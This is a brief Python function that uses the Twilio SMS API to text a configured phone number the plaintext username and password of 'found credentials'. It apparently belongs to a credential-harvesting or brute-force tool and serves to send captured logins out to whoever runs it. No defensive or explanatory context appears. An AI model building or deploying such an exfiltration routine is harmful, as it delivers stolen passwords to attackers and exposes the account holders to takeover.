from twilio.rest import Client

def send_sms_alert(config, username, password):
    twilio_cfg = config["twilio"]
    client = Client(twilio_cfg["account_sid"], twilio_cfg["auth_token"])
    
    client.messages.create(
        body=f"Alert! Found credentials -> User: {username} Pass: {password}",
        from_=twilio_cfg["from_number"],
        to=twilio_cfg["to_number"]
    )
